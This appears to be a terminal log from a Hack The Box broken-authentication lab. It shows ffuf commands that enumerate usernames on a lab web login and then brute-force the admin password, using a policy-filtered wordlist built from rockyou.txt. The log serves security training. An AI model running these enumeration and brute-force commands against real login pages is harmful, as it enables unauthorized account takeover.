# HTB_Broken_Authentication

[✗]─[user@parrot]─[~/Downloads]
└──╼ $ffuf -w xato-net-10-million-usernames.txt -u http://94.237.56.64:35816/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
─[✗]─[user@parrot]─[/usr/share/wordlists]
└──╼ $sudo su
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
grep: rockyou.txt: binary file matches
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt^C
┌─[✗]─[root@parrot]─[/usr/share/wordlists]
└──╼ #grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt^C
┌─[✗]─[root@parrot]─[/usr/share/wordlists]
└──╼ #wc -l custom_wordlist.txt
151647 custom_wordlist.txt
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ #ffuf -w ./custom_wordlist.txt -u http://94.237.121.100:47395/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

